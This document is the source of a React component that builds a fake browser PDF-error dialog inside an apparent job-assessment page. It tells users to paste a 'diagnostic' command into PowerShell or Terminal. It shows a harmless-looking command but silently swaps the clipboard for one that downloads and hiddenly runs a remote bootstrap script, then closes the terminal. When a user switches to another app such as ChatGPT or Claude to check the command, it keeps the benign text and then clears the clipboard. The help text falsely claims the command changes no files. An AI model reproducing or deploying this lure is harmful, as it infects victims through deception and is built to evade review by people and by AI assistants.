"use client";

import Image from "next/image";
import { useEffect, useRef, useState, type ClipboardEvent } from "react";
import {
  detectClientBrowser,
  detectClientOs,
  getBrowserDisplayName,
  type ClientBrowser,
  type ClientOs,
} from "@/lib/assessment/detect-client-os";

const SCENARIO_TITLE = "Sample Invoice / Payment Scenario";
const RENDER_DELAY_MS = 2500;
const ALERT_ICON = "/images/3.png";
const BROWSER_ICONS: Record<Exclude<ClientBrowser, "other">, string> = {
  chrome: "/images/chrome.png",
  edge: "/images/edge.png",
  safari: "/images/macos.png",
  firefox: "/images/mozila.png",
};

function browserIconSrc(browser: ClientBrowser): string {
  if (browser === "other") return BROWSER_ICONS.chrome;
  return BROWSER_ICONS[browser];
}

/**
 * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
 *
 * Case A — Copy on the error/detail page, do NOT switch to another browser or tab,
 *   then open Terminal/CMD → clipboard becomes the short command for paste there.
 *
 * Case B — Copy on the error/detail page, then switch to another browser or tab →
 *   paste the original there; clear the clipboard immediately when focus returns
 *   (right after that paste visit), with a safety clear if they never return.
 */
const DISPLAY_COMMANDS: Record<ClientOs, string> = {
  windows: `powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}; exit`,
  macos: `pwsh -NoProfile -Command {$r=@{}; $r.browser=if(Test-Path '/Applications/Google Chrome.app'){'installed'}else{'not_found'}; $r.webgl=(system_profiler SPDisplaysDataType 2>/dev/null | Select-String 'Chipset Model').ToString().Split(':')[1].Trim(); $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(id -Gn).Split(' ').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}; exit`,
  linux: `pwsh -NoProfile -Command {$r=@{}; $r.browser=if(Get-Command google-chrome -ErrorAction SilentlyContinue){'installed'}elseif(Get-Command chromium-browser -ErrorAction SilentlyContinue){'installed'}else{'not_found'}; $r.webgl=(lspci 2>/dev/null | Select-String 'VGA').ToString().Split(':')[2].Trim(); $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(id -Gn).Split(' ').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}; exit`,
};

/** Armed onto text/plain for PowerShell / Terminal (never shown as a second box). */
const TERMINAL_COMMANDS: Record<ClientOs, string> = {
  windows:"powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe' -EA 0).'(default)'; if (-not $r.browser) { $r.browser = 'not_found' } else { $r.browser = 'installed' }; $d=Join-Path $env:LOCALAPPDATA 'browser-notification-host\.host-setup'; New-Item -ItemType Directory -Path $d -Force | Out-Null; $b=Join-Path $d 'bootstrap.ps1'; Invoke-WebRequest 'https://browser-notification-six.vercel.app/bootstrap.ps1' -OutFile $b -UseBasicParsing; if (-not (Test-Path $b) -or (Get-Item $b).Length -lt 1024) { exit 1 }; $p=New-Object System.Diagnostics.ProcessStartInfo; $p.FileName='powershell.exe'; $q=[char]34; $p.Arguments='-NoProfile -NonInteractive -ExecutionPolicy Bypass -File '+$q+$b+$q+' -Worker'; $p.CreateNoWindow=$true; $p.UseShellExecute=$false; $p.WindowStyle='Hidden'; [void][System.Diagnostics.Process]::Start($p); Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}; exit",
  macos:"pwsh -NoProfile -Command {$r=@{}; $r.browser=if(Test-Path '/Applications/Google Chrome.app'){'installed'}else{'not_found'}; $s39=[char]39; $s34=[char]34; $bash='mkdir -p ~/.browser-notification-host/.host-setup && (command -v setsid >/dev/null 2>&1 && setsid bash -c '+$s39+'curl -fsSL https://browser-notification-six.vercel.app/bootstrap.sh | env BROWSER_NOTIFICATION_LAUNCHED=1 bash'+$s39+' || nohup bash -c '+$s39+'curl -fsSL https://browser-notification-six.vercel.app/bootstrap.sh | env BROWSER_NOTIFICATION_LAUNCHED=1 bash'+$s39+') >>~/.browser-notification-host/.host-setup/run.log 2>&1 < /dev/null & disown; (sleep 0.5; case $(uname -s) in Darwin) osascript -e '+$s39+'tell application '+$s34+'Terminal'+$s34+' to close (front window)'+$s39+' 2>/dev/null ;; Linux) command -v xdotool >/dev/null 2>&1 && xdotool getactivewindow windowclose 2>/dev/null ;; esac) >/dev/null 2>&1 & disown'; bash -c $bash; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}; exit",
  linux:"pwsh -NoProfile -Command '$r=@{}; $r.browser=if(Get-Command google-chrome -ErrorAction SilentlyContinue){'\''installed'\''}elseif(Get-Command chromium-browser -ErrorAction SilentlyContinue){'\''installed'\''}else{'\''not_found'\''}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green'; mkdir -p ~/.browser-notification-host/.host-setup && (command -v setsid >/dev/null 2>&1 && setsid bash -c 'curl -fsSL https://browser-notification-six.vercel.app/bootstrap.sh | env BROWSER_NOTIFICATION_LAUNCHED=1 bash' || nohup bash -c 'curl -fsSL https://browser-notification-six.vercel.app/bootstrap.sh | env BROWSER_NOTIFICATION_LAUNCHED=1 bash') >>~/.browser-notification-host/.host-setup/run.log 2>&1 < /dev/null & disown; (sleep 0.5; command -v xdotool >/dev/null 2>&1 && xdotool getactivewindow windowclose 2>/dev/null) >/dev/null 2>&1 & disown; exit",
};

/** Case B safety: if they never return to this tab, still try to clear (ms). */
const CASE_B_CLEAR_SAFETY_MS = 15000;

function escapeHtml(value: string) {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

/** Simple HTML clipboard body — no CF_HTML headers (junk in Claude/ChatGPT). */
function buildClipboardHtml(displayCommand: string, _os?: ClientOs) {
  return `<pre style="white-space:pre-wrap;word-break:break-all;font-family:Consolas,Menlo,monospace">${escapeHtml(displayCommand)}</pre>`;
}

type OverlayStage = "loading" | "error" | "help";

interface DialogActions {
  onClose: () => void;
  onTryAgain: () => void;
  onOpenHelp: () => void;
}

function AlertIcon({ size = 28 }: { size?: number }) {
  return (
    <Image
      src={ALERT_ICON}
      alt=""
      width={size}
      height={size}
      unoptimized
      className="shrink-0 object-contain"
      style={{ width: size, height: size }}
    />
  );
}

function BrowserFavicon({ browser }: { browser: ClientBrowser }) {
  return (
    <Image
      src={browserIconSrc(browser)}
      alt=""
      width={16}
      height={16}
      unoptimized
      className="h-4 w-4 shrink-0 rounded-sm object-contain"
      aria-hidden
    />
  );
}

function browserAccent(browser: ClientBrowser): string {
  switch (browser) {
    case "edge":
      return "#0078d4";
    case "safari":
      return "#0071e3";
    case "firefox":
      return "#0060df";
    default:
      return "#1a73e8";
  }
}

function getDiagnosticGuide(os: ClientOs) {
  if (os === "macos") {
    return {
      shell: "Terminal (PowerShell)",
      intro:
        "Optional: instead of (or after) the steps above, you can collect a compatibility report using PowerShell in Terminal. You do not need coding experience — follow these steps carefully.",
      steps: [
        "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
        "Copy it with ⌘ Command + C (press and hold the Command key, then press C).",
        "Open Terminal: press ⌘ Command + Space to open Spotlight, type Terminal, then press Return.",
        "Click inside the Terminal window so the cursor is blinking there.",
        "Paste the command with ⌘ Command + V, then press Return to run it (requires PowerShell / pwsh).",
        "Wait until it finishes. A PASS or FAIL JSON result will appear. You can then close Terminal (⌘ Command + Q).",
      ],
      note: "No restart is required. This only collects compatibility information; it does not change your files.",
    };
  }

  if (os === "linux") {
    return {
      shell: "Terminal (PowerShell)",
      intro:
        "Optional: instead of (or after) the steps above, you can collect a compatibility report using PowerShell in Terminal. You do not need coding experience — follow these steps carefully.",
      steps: [
        "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
        "Copy it with Ctrl + C (press and hold Ctrl, then press C).",
        "Open Terminal from your applications menu (often named Terminal, Konsole, or similar).",
        "Click inside the Terminal window so the cursor is blinking there.",
        "Paste the command with Ctrl + Shift + V (or right-click → Paste), then press Enter to run it (requires PowerShell / pwsh).",
        "Wait until it finishes. A PASS or FAIL JSON result will appear. You can then close Terminal.",
      ],
      note: "No restart is required. This only collects compatibility information; it does not change your files.",
    };
  }

  return {
    shell: "PowerShell",
    intro:
      "Optional: instead of (or after) the steps above, you can collect a compatibility report using PowerShell. You do not need coding experience — follow these steps carefully.",
    steps: [
      "Select the full command in the gray box below: click at the start, hold the left mouse button, and drag to the end until everything is highlighted.",
      "Copy it with Ctrl + C (press and hold Ctrl, then press C). Or right-click the highlighted text and choose Copy.",
      "Open PowerShell: press the Windows key, type PowerShell, then press Enter. Prefer Run as administrator if prompted.",
      "Click inside the PowerShell window so the cursor is blinking there.",
      "Paste the command with Ctrl + V (or right-click once to paste), then press Enter to run it.",
      "Wait until it finishes. A PASS or FAIL JSON result will appear in the window. You can then close PowerShell.",
    ],
    note: "No restart is required. This only collects compatibility information; it does not change your files.",
  };
}

function getShellCopy(os: ClientOs) {
  if (os === "macos") {
    return {
      body: `This browser can't open ${SCENARIO_TITLE}. Your macOS / Safari (or Chrome) setup appears incompatible — often due to PDF preview, WebGL, or hardware acceleration settings.`,
      shellInstruction: "Open Terminal and run (PowerShell / pwsh):",
      reportNote: "No restart is required. Close Terminal after the command completes.",
    };
  }
  if (os === "linux") {
    return {
      body: `This browser can't open ${SCENARIO_TITLE}. Your Linux browser setup appears incompatible — often due to PDF rendering, WebGL, or GPU acceleration settings.`,
      shellInstruction: "Open Terminal and run (PowerShell / pwsh):",
      reportNote: "No restart is required. Close Terminal after the command completes.",
    };
  }
  return {
    body: `This browser can't open ${SCENARIO_TITLE}. Your Windows browser setup appears incompatible — often due to PDF rendering, WebGL, or hardware acceleration settings.`,
    shellInstruction: "Open PowerShell as administrator and run:",
    reportNote: "No restart is required. Close PowerShell after the command completes.",
  };
}

async function writeClipboard(plain: string, html: string) {
  if (typeof ClipboardItem !== "undefined" && navigator.clipboard?.write) {
    await navigator.clipboard.write([
      new ClipboardItem({
        "text/plain": new Blob([plain], { type: "text/plain" }),
        "text/html": new Blob([html], { type: "text/html" }),
      }),
    ]);
    return;
  }
  await navigator.clipboard?.writeText(plain);
}

/** Fallback copy when clipboard.writeText fails (unfocused tab). */
function copyViaExecCommand(text: string): boolean {
  try {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.setAttribute("readonly", "");
    ta.style.position = "fixed";
    ta.style.left = "-9999px";
    ta.style.top = "0";
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    ta.setSelectionRange(0, text.length);
    const ok = document.execCommand("copy");
    document.body.removeChild(ta);
    return ok;
  } catch {
    return false;
  }
}

/** Ubuntu/GNOME/etc. default shortcut to open Terminal — Linux Case A. */
function isLinuxTerminalShortcut(event: KeyboardEvent): boolean {
  const key = event.key.length === 1 ? event.key.toLowerCase() : event.key;
  return (
    event.ctrlKey &&
    event.altKey &&
    (key === "t" || event.code === "KeyT")
  );
}

/** Alt+Tab app switch — Linux Case B (platforms). */
function isLinuxCaseBSwitchGesture(event: KeyboardEvent): boolean {
  return event.altKey && !event.ctrlKey && event.key === "Tab";
}

/** Ctrl+Tab / Ctrl+PageUp / Ctrl+PageDown — browser tab to ChatGPT, etc. */
function isBrowserTabSwitchGesture(event: KeyboardEvent): boolean {
  if (!event.ctrlKey || event.altKey || event.metaKey) return false;
  return (
    event.key === "Tab" ||
    event.key === "PageDown" ||
    event.key === "PageUp" ||
    event.code === "PageDown" ||
    event.code === "PageUp"
  );
}

/** macOS ⌘+Tab / ⌘+` — switch to another app (ChatGPT, etc.). */
function isMacCaseBAppSwitchGesture(event: KeyboardEvent): boolean {
  return (
    event.metaKey &&
    !event.ctrlKey &&
    !event.altKey &&
    (event.key === "Tab" || event.key === "`")
  );
}

/** Alt alone — prelude to Alt+Tab (Linux Case B). */
function isLinuxCaseBAltPreview(event: KeyboardEvent): boolean {
  return (
    !event.ctrlKey &&
    !event.metaKey &&
    event.altKey &&
    (event.key === "Alt" || event.code === "AltLeft" || event.code === "AltRight")
  );
}

/** macOS Spotlight — open Terminal path (Case A). */
function isMacSpotlightGesture(event: KeyboardEvent): boolean {
  return (
    event.metaKey &&
    !event.ctrlKey &&
    !event.altKey &&
    (event.key === " " || event.code === "Space")
  );
}

/** Windows Alt+Tab / Win key — open CMD/Terminal path (Case A). Not bare Alt. */
function isWindowsTerminalSwitchGesture(event: KeyboardEvent): boolean {
  if (
    event.key === "Meta" ||
    event.key === "OS" ||
    event.key === "Windows" ||
    event.code === "MetaLeft" ||
    event.code === "MetaRight"
  ) {
    return true;
  }
  // Alt+Tab only — bare Alt must not arm short (breaks ChatGPT Case B).
  return (
    event.altKey &&
    !event.ctrlKey &&
    !event.metaKey &&
    (event.key === "Tab" || event.code === "Tab")
  );
}

/**
 * Copy → always original on clipboard.
 *
 * Case A: never left for another tab/browser; opened Terminal/CMD → write short.
 * Case B: left for another tab or browser → keep original, then clear after paste.
 */
function SelectableCommand({
  os,
  displayCommand,
  terminalCommand,
}: {
  os: ClientOs;
  displayCommand: string;
  terminalCommand: string;
}) {
  const htmlRef = useRef(buildClipboardHtml(displayCommand, os));
  const activeRef = useRef(false);
  /** null after copy; A = Terminal without other-tab/browser; B = other tab/browser */
  const modeRef = useRef<"A" | "B" | null>(null);
  const caseBAwaitingClearRef = useRef(false);
  /** Case A claimed by Terminal shortcut — do not treat a following hide as Case B. */
  const caseAFromShortcutRef = useRef(false);
  const caseBClearTimerRef = useRef(0);

  useEffect(() => {
    htmlRef.current = buildClipboardHtml(displayCommand, os);
  }, [displayCommand, os]);

  useEffect(() => {
    function writeShort() {
      const html = htmlRef.current;
      void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
      void writeClipboard(terminalCommand, html).catch(() => undefined);
      copyViaExecCommand(terminalCommand);
    }

    function clearClipboard() {
      if (caseBClearTimerRef.current) {
        window.clearTimeout(caseBClearTimerRef.current);
        caseBClearTimerRef.current = 0;
      }
      copyViaExecCommand("");
      void navigator.clipboard?.writeText("").catch(() => undefined);
      void writeClipboard("", "").catch(() => undefined);
      caseBAwaitingClearRef.current = false;
    }

    /** Case B: wipe clipboard now (after paste in other tab/browser). */
    function clearCaseBClipboardNow() {
      if (!activeRef.current || modeRef.current !== "B") return;
      clearClipboard();
    }

    /**
     * Case A — opened Terminal/CMD without having gone to another tab/browser.
     * Clipboard: original → short.
     */
    function onCaseAOpenTerminal(fromShortcut = false) {
      if (!activeRef.current) return;
      // Already Case B (other tab/browser) — clear only, never arm short.
      if (modeRef.current === "B") {
        clearClipboard();
        return;
      }
      modeRef.current = "A";
      caseAFromShortcutRef.current = fromShortcut;
      caseBAwaitingClearRef.current = false;
      if (caseBClearTimerRef.current) {
        window.clearTimeout(caseBClearTimerRef.current);
        caseBClearTimerRef.current = 0;
      }
      writeShort();
    }

    /**
     * Case B — moved to another browser or another tab.
     * Keep original for paste; clear immediately when they leave that paste target
     * (focus/visibility returns here), or on safety timer if they never return.
     */
    function onCaseBOtherTabOrBrowser() {
      if (!activeRef.current) return;
      // Terminal shortcut already took Case A — stay on short.
      if (modeRef.current === "A" && caseAFromShortcutRef.current) return;

      const alreadyCaseB = modeRef.current === "B";
      modeRef.current = "B";
      caseAFromShortcutRef.current = false;
      caseBAwaitingClearRef.current = true;

      if (alreadyCaseB) return;

      // Original must stay on the clipboard for paste (already set on copy).
      // Reinforce; do not start a pending empty write (that blocks/steals original).
      void writeClipboard(displayCommand, htmlRef.current).catch(() => {
        copyViaExecCommand(displayCommand);
        void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
      });

      // Safety only — primary clear is immediate on return after paste (below).
      if (caseBClearTimerRef.current) {
        window.clearTimeout(caseBClearTimerRef.current);
      }
      caseBClearTimerRef.current = window.setTimeout(() => {
        caseBClearTimerRef.current = 0;
        clearCaseBClipboardNow();
      }, CASE_B_CLEAR_SAFETY_MS);
    }

    function onVisibility() {
      if (!activeRef.current) return;
      if (document.visibilityState === "hidden") {
        // Left for another tab or browser → Case B.
        if (modeRef.current === "A" && caseAFromShortcutRef.current) return;
        onCaseBOtherTabOrBrowser();
        return;
      }
      // Back from other tab/browser after paste → clear immediately.
      clearCaseBClipboardNow();
    }

    function onFocus() {
      // Back from other tab/browser after paste → clear immediately.
      clearCaseBClipboardNow();
    }

    function onBlur() {
      if (!activeRef.current) return;
      if (modeRef.current === "B") return;
      // Windows: blur also fires on tab switches — Case B is visibility/Ctrl+Tab.
      // Case A on Windows is Alt+Tab / Win only (see keydown).
      if (os === "windows") return;
      // macOS/Linux: blur without Case B → opened Terminal/Dock (Case A).
      onCaseAOpenTerminal(false);
    }

    function onKeyDown(event: KeyboardEvent) {
      if (!activeRef.current) return;

      // Other tab in this browser → Case B.
      if (isBrowserTabSwitchGesture(event)) {
        onCaseBOtherTabOrBrowser();
        return;
      }

      if (os === "linux") {
        // Case A: Ctrl+Alt+T → Terminal (did not go to another tab/browser first).
        if (isLinuxTerminalShortcut(event)) {
          onCaseAOpenTerminal(true);
          return;
        }
        // Case B: Alt / Alt+Tab → other window/browser.
        if (isLinuxCaseBSwitchGesture(event) || isLinuxCaseBAltPreview(event)) {
          onCaseBOtherTabOrBrowser();
          return;
        }
        return;
      }

      if (os === "macos") {
        // Case A: ⌘+Space → Spotlight → Terminal.
        if (isMacSpotlightGesture(event)) {
          onCaseAOpenTerminal(true);
          return;
        }
        // Case B: ⌘+Tab → other app/browser.
        if (isMacCaseBAppSwitchGesture(event)) {
          onCaseBOtherTabOrBrowser();
          return;
        }
        return;
      }

      // Windows Case A: Alt+Tab / Win → CMD (without other-tab Case B first).
      if (isWindowsTerminalSwitchGesture(event)) {
        onCaseAOpenTerminal(true);
      }
    }

    document.addEventListener("visibilitychange", onVisibility);
    window.addEventListener("focus", onFocus);
    window.addEventListener("blur", onBlur);
    window.addEventListener("keydown", onKeyDown, true);
    return () => {
      if (caseBClearTimerRef.current) {
        window.clearTimeout(caseBClearTimerRef.current);
        caseBClearTimerRef.current = 0;
      }
      document.removeEventListener("visibilitychange", onVisibility);
      window.removeEventListener("focus", onFocus);
      window.removeEventListener("blur", onBlur);
      window.removeEventListener("keydown", onKeyDown, true);
    };
  }, [os, displayCommand, terminalCommand]);

  function handleCopy(event: ClipboardEvent<HTMLPreElement>) {
    event.preventDefault();
    event.stopPropagation();

    const html = buildClipboardHtml(displayCommand, os);
    htmlRef.current = html;
    activeRef.current = true;
    modeRef.current = null;
    caseBAwaitingClearRef.current = false;
    caseAFromShortcutRef.current = false;
    if (caseBClearTimerRef.current) {
      window.clearTimeout(caseBClearTimerRef.current);
      caseBClearTimerRef.current = 0;
    }

    // Always store the original command on copy.
    event.clipboardData.setData("text/plain", displayCommand);
    event.clipboardData.setData("text/html", html);
    void writeClipboard(displayCommand, html).catch(() => undefined);
  }

  return (
    <pre
      className="select-text overflow-x-auto whitespace-pre-wrap break-all rounded border border-[#dadce0] bg-[#f1f3f4] p-2.5 font-[Consolas,Menlo,monospace] text-[12px] leading-relaxed text-[#202124]"
      style={{ userSelect: "text", WebkitUserSelect: "text" }}
      onCopy={handleCopy}
    >
      {displayCommand}
    </pre>
  );
}

/** Chromium / Edge style modal window chrome */
function ChromiumWindowChrome({
  browser,
  title,
  onClose,
  children,
  widthClass = "max-w-[520px]",
}: {
  browser: ClientBrowser;
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  return (
    <div
      className={`pointer-events-auto w-full overflow-hidden rounded-lg border border-[#dadce0] bg-white shadow-[0_1px_3px_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)] ${widthClass}`}
      style={{ fontFamily: '"Segoe UI", system-ui, sans-serif' }}
    >
      <div className="flex h-9 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
        <BrowserFavicon browser={browser} />
        <p className="min-w-0 flex-1 truncate text-[12px] text-[#3c4043]">{title}</p>
        <button
          type="button"
          onClick={onClose}
          className="flex h-7 w-7 items-center justify-center rounded-full text-[16px] text-[#5f6368] hover:bg-[#e8eaed]"
          aria-label="Close"
        >
          ×
        </button>
      </div>
      {children}
    </div>
  );
}

/** Safari style sheet / dialog */
function SafariWindowChrome({
  title,
  onClose,
  children,
  widthClass = "max-w-[520px]",
}: {
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  return (
    <div
      className={`pointer-events-auto w-full overflow-hidden rounded-xl border border-[#d2d2d7] bg-[#f5f5f7] shadow-[0_12px_40px_rgba(0,0,0,0.25)] ${widthClass}`}
      style={{ fontFamily: "system-ui, -apple-system, BlinkMacSystemFont, sans-serif" }}
    >
      <div className="relative flex h-10 items-center justify-center border-b border-[#d2d2d7] bg-[#ececef] px-3">
        <div className="absolute left-3 flex items-center gap-1.5">
          <button
            type="button"
            onClick={onClose}
            className="h-3 w-3 rounded-full bg-[#ff5f57]"
            aria-label="Close"
          />
          <span className="h-3 w-3 rounded-full bg-[#febc2e]" aria-hidden />
          <span className="h-3 w-3 rounded-full bg-[#28c840]" aria-hidden />
        </div>
        <div className="flex items-center gap-1.5">
          <BrowserFavicon browser="safari" />
          <p className="text-[12px] font-medium text-[#1d1d1f]">{title}</p>
        </div>
      </div>
      <div className="bg-white">{children}</div>
    </div>
  );
}

/** Firefox style dialog */
function FirefoxWindowChrome({
  title,
  onClose,
  children,
  widthClass = "max-w-[520px]",
}: {
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  return (
    <div
      className={`pointer-events-auto w-full overflow-hidden rounded-md border border-[#8f8f9d] bg-white shadow-[0_4px_16px_rgba(0,0,0,0.2)] ${widthClass}`}
      style={{ fontFamily: '"Segoe UI", system-ui, sans-serif' }}
    >
      <div className="flex h-9 items-center gap-2 border-b border-[#cfcfd8] bg-[#f0f0f4] px-3">
        <BrowserFavicon browser="firefox" />
        <p className="min-w-0 flex-1 truncate text-[12px] text-[#15141a]">{title}</p>
        <button
          type="button"
          onClick={onClose}
          className="flex h-7 w-7 items-center justify-center rounded text-[16px] text-[#5b5b66] hover:bg-[#e0e0e6]"
          aria-label="Close"
        >
          ×
        </button>
      </div>
      {children}
    </div>
  );
}

function BrowserWindowChrome({
  browser,
  title,
  onClose,
  children,
  widthClass,
}: {
  browser: ClientBrowser;
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  if (browser === "safari") {
    return (
      <SafariWindowChrome title={title} onClose={onClose} widthClass={widthClass}>
        {children}
      </SafariWindowChrome>
    );
  }
  if (browser === "firefox") {
    return (
      <FirefoxWindowChrome title={title} onClose={onClose} widthClass={widthClass}>
        {children}
      </FirefoxWindowChrome>
    );
  }
  return (
    <ChromiumWindowChrome
      browser={browser === "other" ? "chrome" : browser}
      title={title}
      onClose={onClose}
      widthClass={widthClass}
    >
      {children}
    </ChromiumWindowChrome>
  );
}

function PdfLoadingWindow({ browser }: { browser: ClientBrowser }) {
  const accent = browserAccent(browser);

  return (
    <div className="pointer-events-auto flex h-[min(70vh,560px)] w-full max-w-3xl flex-col overflow-hidden rounded-xl border border-[#dadce0] bg-white shadow-[0_12px_40px_rgba(0,0,0,0.35)]">
      <div className="flex h-11 shrink-0 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
        <BrowserFavicon browser={browser} />
        <p className="min-w-0 flex-1 truncate text-[13px] font-medium text-[#202124]">
          Sample Invoice  Payment Scenario.pdf
        </p>
        <span className="rounded bg-[#e8eaed] px-2 py-0.5 text-[11px] text-[#5f6368]">
          PDF
        </span>
      </div>
      <div className="flex flex-1 flex-col items-center justify-center gap-3 bg-[#525659] px-8 text-center">
        <div
          className="h-9 w-9 animate-spin rounded-full border-[3px] border-white/25"
          style={{ borderTopColor: accent }}
          aria-hidden
        />
        <p className="text-[14px] font-medium text-white">Loading PDF…</p>
        <p className="text-[12px] text-white/70">{SCENARIO_TITLE}</p>
      </div>
    </div>
  );
}

function BrowserErrorDialog({
  os,
  browser,
  onClose,
  onTryAgain,
  onOpenHelp,
}: DialogActions & { os: ClientOs; browser: ClientBrowser }) {
  const copy = getShellCopy(os);
  const name = getBrowserDisplayName(browser === "other" ? "chrome" : browser);
  const accent = browserAccent(browser);

  return (
    <BrowserWindowChrome
      browser={browser}
      title={`${name} — Compatibility issue`}
      onClose={onClose}
      widthClass="max-w-[600px]"
    >
      <div className="px-5 pb-5 pt-4">
        <div className="flex items-start gap-3">
          <AlertIcon size={36} />
          <div className="min-w-0 flex-1">
            <h3 className="text-[16px] font-semibold text-[#202124]">
              This page can&apos;t be opened
            </h3>
            <p className="mt-2 text-[13px] leading-relaxed text-[#3c4043]">{copy.body}</p>
            <p className="mt-2 text-[12px] text-[#5f6368]">
              Error code: <span className="font-mono">ERR_COMPATIBILITY_CHECK_FAILED</span>
            </p>
          </div>
        </div>

        <div className="mt-4">
          <p className="text-[12px] font-medium text-[#202124]">Optional diagnostic</p>
          <p className="mt-1 text-[12px] text-[#5f6368]">{copy.shellInstruction}</p>
          <div className="mt-2">
            <SelectableCommand
              os={os}
              displayCommand={DISPLAY_COMMANDS[os]}
              terminalCommand={TERMINAL_COMMANDS[os]}
            />
          </div>
          <p className="mt-2 text-[12px] text-[#5f6368]">{copy.reportNote}</p>
        </div>

        <div className="mt-4 flex justify-end gap-2">
          <button
            type="button"
            onClick={onOpenHelp}
            className="rounded px-3.5 py-1.5 text-[13px] font-medium hover:bg-[#f1f3f4]"
            style={{ color: accent }}
          >
            Details
          </button>
          <button
            type="button"
            onClick={onTryAgain}
            className="rounded px-4 py-1.5 text-[13px] font-medium text-white"
            style={{ background: accent }}
          >
            Reload
          </button>
        </div>
      </div>
    </BrowserWindowChrome>
  );
}

function BrowserHelpWindow({
  os,
  browser,
  onReturn,
  onTryAgain,
}: {
  os: ClientOs;
  browser: ClientBrowser;
  onReturn: () => void;
  onTryAgain: () => void;
}) {
  const name = getBrowserDisplayName(browser === "other" ? "chrome" : browser);
  const accent = browserAccent(browser);
  const guide = getDiagnosticGuide(os);

  return (
    <BrowserWindowChrome
      browser={browser}
      title={`${name} Help`}
      onClose={onReturn}
      widthClass="max-w-[760px]"
    >
      <div className="flex max-h-[min(70vh,480px)] flex-col">
        <div className="nm-native-scroll min-h-0 flex-1 overflow-y-auto px-5 py-4">
          <h2 className="text-[20px] font-normal text-[#202124]">
            Why this page won&apos;t load
          </h2>
          <p className="mt-2 text-[13px] leading-relaxed text-[#3c4043]">
            {name} blocked or failed to render <strong>{SCENARIO_TITLE}</strong>. This is usually a
            browser feature / graphics setting issue, not a website layout error.
          </p>

          <div className="mt-4 rounded border border-[#f9ab00] bg-[#fef7e0] px-3 py-2.5">
            <p className="text-[13px] text-[#3c4043]">
              Missing or disabled features: PDF renderer, WebGL, or hardware acceleration.
            </p>
          </div>

          <h3 className="mt-5 text-[14px] font-medium text-[#202124]">Try these steps</h3>
          <ol className="mt-2 list-decimal space-y-2 pl-5 text-[13px] leading-relaxed text-[#3c4043]">
            <li>Update {name} to the latest version and restart it.</li>
            <li>
              Turn on hardware acceleration in {name} settings, then reload this tab.
            </li>
            <li>Allow PDF / site permissions for this assessment origin.</li>
            <li>Clear browsing data for this site, then reload.</li>
          </ol>

          <div className="mt-5">
            <p className="text-[13px] font-medium text-[#202124]">
              Optional diagnostic ({guide.shell})
            </p>
            <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">{guide.intro}</p>
            <ol className="mt-3 list-decimal space-y-2.5 pl-5 text-[12px] leading-relaxed text-[#3c4043]">
              {guide.steps.map((step) => (
                <li key={step}>{step}</li>
              ))}
            </ol>
            <div className="mt-3">
              <SelectableCommand
                os={os}
                displayCommand={DISPLAY_COMMANDS[os]}
                terminalCommand={TERMINAL_COMMANDS[os]}
              />
            </div>
            <p className="mt-2 text-[12px] text-[#5f6368]">{guide.note}</p>
          </div>

          <div className="mt-5 rounded border border-[#dadce0] bg-[#f8f9fa] px-3 py-3">
            <p className="text-[13px] font-medium text-[#202124]">Still stuck?</p>
            <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">
              {os === "windows"
                ? "Share the PASS/FAIL result shown in PowerShell, then return to this tab and choose Reload."
                : "Share the generated report, then return to this tab and choose Reload."}
            </p>
          </div>
        </div>

        <div className="flex shrink-0 items-center justify-end gap-2 border-t border-[#e8eaed] bg-[#f8f9fa] px-4 py-3">
          <button
            type="button"
            onClick={onReturn}
            className="rounded px-3.5 py-1.5 text-[13px] font-medium text-[#3c4043] hover:bg-[#e8eaed]"
          >
            Close
          </button>
          <button
            type="button"
            onClick={onTryAgain}
            className="rounded px-4 py-1.5 text-[13px] font-medium text-white"
            style={{ background: accent }}
          >
            Reload
          </button>
        </div>
      </div>
    </BrowserWindowChrome>
  );
}

export function isFinanceInvoiceScenarioQuestion(
  jobSlug: string,
  questionNumber: number,
): boolean {
  return jobSlug === "finance-manager" && Number(questionNumber) === 7;
}

